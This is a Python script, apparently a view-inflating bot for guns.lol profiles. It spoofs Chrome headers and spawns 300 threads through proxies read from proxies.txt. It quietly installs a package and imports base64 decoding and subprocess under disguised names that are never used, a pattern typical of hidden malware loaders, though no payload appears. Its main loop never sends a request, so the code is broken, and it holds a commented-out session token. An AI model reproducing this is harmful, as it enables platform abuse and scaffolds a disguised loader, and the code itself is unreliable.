import os
import sys

try:
    os.system("pip install requests")

    from concurrent.futures import ThreadPoolExecutor
    import random
    from requests import get as proxyfetch
    from base64 import b64decode as undecode
    import subprocess as sb
    from threading import Thread 
    banner=""" ▄▄ • ▄• ▄▌ ▐ ▄ .▄▄ ·   ▄▄▌        ▄▄▌     ▌ ▐·▪  ▄▄▄ .▄▄▌ ▐ ▄▌▄▄▄▄·       ▄▄▄▄▄
    ▐█ ▀ ▪█▪██▌•█▌▐█▐█ ▀.   ██•   ▄█▀▄ ██•    ▪█·█▌██ ▀▄.▀·██· █▌▐█▐█ ▀█▪ ▄█▀▄ •██  
    ▄█ ▀█▄█▌▐█▌▐█▐▐▌▄▀▀▀█▄  ██▪  ▐█▌.▐▌██▪    ▐█▐█•▐█·▐▀▀▪▄██▪▐█▐▐▌▐█▀▀█▄▐█▌.▐▌ ▐█.▪
    ▐█▄▪▐█▐█▄█▌██▐█▌▐█▄▪▐█  ▐█▌▐▌▐█▌.▐▌▐█▌▐▌   ███ ▐█▌▐█▄▄▌▐█▌██▐█▌██▄▪▐█▐█▌.▐▌ ▐█▌·
    ·▀▀▀▀  ▀▀▀ ▀▀ █▪ ▀▀▀▀ ▀ .▀▀▀  ▀█▄▀▪.▀▀▀   . ▀  ▀▀▀ ▀▀▀  ▀▀▀▀ ▀▪·▀▀▀▀  ▀█▄▀▪ ▀▀▀ 
    """
    print(banner)
    url = input("Votre pseudo guns.lol > ")
    headers = {
        #"cookie": "security_token=6d647174d809ee80e2ad14f80fe07cb5c2c1517d5ea72a7401b403eb5ead5c2e",
        "accept": "*/*",
        "accept-language": "?0; Mobile",
        "cache-control": "no-cache",
        "content-length": "0",
        "origin": "https://guns.lol",
        "pragma": "no-cache",
        "priority": "u=1, i",
        "referer": "https://guns.lol/"+url,
        "sec-ch-ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Google Chrome\";v=\"126\"",
        "sec-ch-ua-arch": "\"x86\"",
        "sec-ch-ua-bitness": "\"64\"",
        "sec-ch-ua-full-version": "\"126.0.6478.127\"",
        "sec-ch-ua-full-version-list": "\"Not/A)Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"126.0.6478.127\", \"Google Chrome\";v=\"126.0.6478.127\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-model": "\"\"",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-ch-ua-platform-version": "\"15.0.0\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "username": url
    }
    views = 0
    def test():
        global url, headers, views
        while True:
            prox = random.choice(open("proxies.txt").read().splitlines())
            proxy = "http://" + prox
            proxyDict = {
                "http": proxy,
                "https": proxy
            }
    with ThreadPoolExecutor(max_workers=301) as exc:
        for i in range(300):
            exc.submit(test)
except Exception as e:
    print(e)
    print('\n\n')
    input('Run the script again, if this keeps happening make a ticket')
    sys.exit()
